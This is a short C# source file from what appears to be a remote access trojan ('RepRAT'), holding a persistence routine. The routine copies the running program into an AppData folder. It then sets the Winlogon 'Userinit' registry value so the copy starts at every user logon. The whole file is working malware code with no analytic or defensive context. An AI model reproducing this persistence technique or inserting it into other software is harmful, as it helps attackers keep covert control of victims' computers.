using Microsoft.Win32;

namespace RepRAT.Persistence;

public class Inject
{
    public static void winlogonInject()
    {
        string a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\Master\\";
        DirectoryInfo di = Directory.CreateDirectory(a);
        string src = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        string dest = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString() + "\\Master\\";
        var f = System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe";
        if (!File.Exists(dest + f))
        {
            File.Copy(src, Path.Combine(dest, Path.GetFileName(src)));
            RegistryKey myKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
            if(myKey != null)    {
                myKey.SetValue("Userinit", "Userinit.exe, " + dest + f, RegistryValueKind.String);
                myKey.Close();
            
            }
        }
        
    }
}